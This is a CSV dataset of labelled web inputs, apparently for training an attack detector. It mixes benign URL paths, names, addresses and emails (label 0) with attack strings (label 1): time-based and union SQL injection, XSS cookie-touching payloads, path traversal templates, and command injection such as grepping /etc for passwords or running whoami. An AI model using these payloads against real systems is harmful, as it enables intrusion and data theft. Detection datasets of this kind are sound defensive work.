payload,label
4811965033503576,0
nieva de cameros,0
"1)) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((4348=4348",1
aldebar,0
/team/verona/pcROMQop/statistics,0
/api/v1/users?q=shoes618,0
caizares,0
"-1<BODY BACKGROUND=""javascript:document.cookie=true;"">",1
0765386023011242,0
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1"")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#",1
dudas@google-movil.np,0
tolox,0
/api/v1/auth?token=29ZFrT4X,0
chavez jofre,0
/team/verona/d3QbEulu/statistics,0
daviu callarisa,0
decuplar,0
027eja,0
1))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((2197=2197,1
/product?id=672993&utm_source=facebook&campaign=sale,0
">""<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>",1
Cross Site Scripting Strings with negative value & TAG:,1
"1"") order by 1--",1
nolie,0
&& fdisk -l,1
mo3tren04,0
e4te9ad2,0
"1%'));select count(*) from generate_series(1,5000000)--",1
/api/v1/auth?token=fb22B1Xx,0
"1))) or elt(5873=5873,sleep(5))#",1
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
1558387364197747,0
"santa vera cruz, 21",0
/api/v1/auth?token=Xr88xFgU,0
lafleur,0
"pont de bar, el",0
/product/detail?id=contact930,0
"-8667'+(select ymmg where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",1
baltasar,0
/home?id=kma777,0
1);select (case when (6435=8988) then 6435 else 6435*(select 6435 from information_schema.character_sets) end)#,1
hartford,0
c/ maria zayas de sotomayor 18,0
"hospitalet de llobregat, l'",0
1') and 2577=7094,1
"1%"")));waitfor delay '0:0:5'--",1
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh",1
/login?redirect_url=/dashboard/user/472175,0
2969,0
at89a7218,0
pozuelo de calatrava,0
"1,(select (case when (5334=4976) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",1
nadina,0
5exas9labo,0
9782,0
/api/v1/auth?token=WFrmkvCv,0
/api/v1/users?token=2026915,0
/product?id=563610&utm_source=facebook&campaign=sale,0
"urbanitzacio las lomas, 18, 4a",0
93310194e,0
pintado,0
63829565b,0
1') and 6969=(select 6969 from pg_sleep(5)),1
|| cmd /c ipconfig,1
ag2u7a,0
/assets/style.css?user=hải314,0
iranzo,0
85022940j,0
cantabria,0
</object>,1
/team/verona/gU5RXN7z/statistics,0
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",1
preixens,0
"|| grep -r ""password"" /etc/",1
“><script>alert(123);</script>,1
hans,0
/login?redirect_url=/dashboard/user/110410,0
"1"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",1
%2bADw-script%2bAD4-%0d%0aalert(1)%2bADw-%2fscript%2bAD4-,1
/assets/style.css?user=admin335,0
morgan,0
witting@videotubo.cl,0
"| powershell -Command ""whoami""",1
/login.html?id=123485,0
/home?user=book738,0
/api/v1/auth?token=3j8GPLTc,0
/search?q=123960,0
"1"") as wxea where 6394=6394 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
3582076186939679,0
0r90di89r,0
/team/verona/3VYQwc3i/statistics,0
zumaran solsona,0
c/ florida 162 1-f,0
/product?id=525615&utm_source=facebook&campaign=sale,0
adelia,0
"1') where 2443=2443 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",1
"-7448 union all select 4072,4072#",1
priado,0
/search?user=admin776,0
-1<style><!--</style><script>document.cookie=true;//--></script>,1
| /b\in/i\d,1
israel_piggot@joyclub.pe,0
"1') where 1804=1804 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""hvwv""=""hvwv",1
"1%'))) union all select null,null,null#",1
; ls%0c,1
"1;select count(*) from generate_series(1,5000000)-- gqkk",1
1'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
1734128437321844,0
"c/ catedratico jose maria castro, 83",0
-6722') order by 1#,1
/api/v1/auth?token=HeIdibvX,0
17744,0
retenidamente,0
/login.html?page=admin96,0
pasote,0
torre val de san pedro,0
michiel,0
40145,0
0851327510236186,0
09493,0
1'||(select 'dsjg' where 2402=2402 and 1947=7472--,1
freiss@turinga.tn,0
"1"";select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1
/home?page=admin151,0
f8li48e3,0
26987451x,0
mantegna-romney@underdog.tc,0
ti2etana,0
; whoami${u},1
/login?redirect_url=/dashboard/user/617827,0
/product?id=572071&utm_source=facebook&campaign=sale,0
26291,0
/team/verona/dKKPICjW/statistics,0
/login.html?q=123187,0
portal,0
/api/v1/auth?token=jAf6V3xe,0
cehegn,0
albatana,0
/..//..//..//..//..//{file},1
5900,0
budd9,0
3497,0
corb9ch4da,0
/login.html?q=book101,0
/search?page=kma143,0
1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
/product?id=388397&utm_source=facebook&campaign=sale,0
"<img id=xss src=""jav ascript:alert('xss');"">",1
"1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('vedm'='vedm",1
/login?redirect_url=/dashboard/user/28255,0
on,0
/login?redirect_url=/dashboard/user/331430,0
/login.html?page=123993,0
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('urxs'='urxs",1
53486450l,0
monzons cambeiro,0
garner3,0
scheurer ezpeleta,0
"1)) union all select null,null--",1
/login.html?id=apple121,0
castell d'empries,0
/index.php?id=202637,0
8ho0l2,0
/index.php?user=profile266,0
"antonio toledano, 78, 10?h",0
/product?id=56505&utm_source=facebook&campaign=sale,0
/product?id=233690&utm_source=facebook&campaign=sale,0
"1%' union all select null,null,null,null,null,null,null,null,null--",1
dalal,0
51795949h,0
c09so18,0
/login.html?q=admin309,0
patten,0
1 where 5691=5691 and (select * from (select(sleep(5)))fzno)--,1
12001090n,0
/login.html?id=shoes201,0
/product?id=38593&utm_source=facebook&campaign=sale,0
1));if(7899=7899) select 7899 else drop function zbbp--,1
/team/verona/hCfovurz/statistics,0
/0x2e0x2e0x2f0x2e0x2e0x2f{file},1
armintario,0
gift@distritoeste.no,0
bittman,0
11640,0
/login?redirect_url=/dashboard/user/458758,0
yax,0
1%'))) and (select * from (select(sleep(5)))gcrr)#,1
tvara ganci,0
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",1
emp34h82o,0
"1%')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
3842504207322211,0
